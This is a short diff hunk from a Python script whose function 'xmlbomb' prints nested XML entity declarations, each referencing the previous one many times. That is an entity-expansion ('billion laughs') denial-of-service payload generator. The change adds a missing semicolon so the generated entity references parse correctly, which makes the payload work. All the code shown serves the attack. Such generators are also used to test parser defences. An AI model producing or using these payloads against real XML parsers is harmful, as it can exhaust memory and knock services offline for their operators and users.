@@ -16,7 +16,7 @@ def xmlbomb(ents, refs, name, content):
 		for _ in range(refs):
 			k.append('&' + str(j))
 		sys.stdout.write("; ".join(k))
-		sys.stdout.write('">\n')
+		sys.stdout.write(';">\n')
 	sys.stdout.write('  <!ENTITY start "&' + str(i) + ';">\n')
 	sys.stdout.write(']>\n')
 	sys.stdout.write('<' + name + '>&start;</' + name + '>')
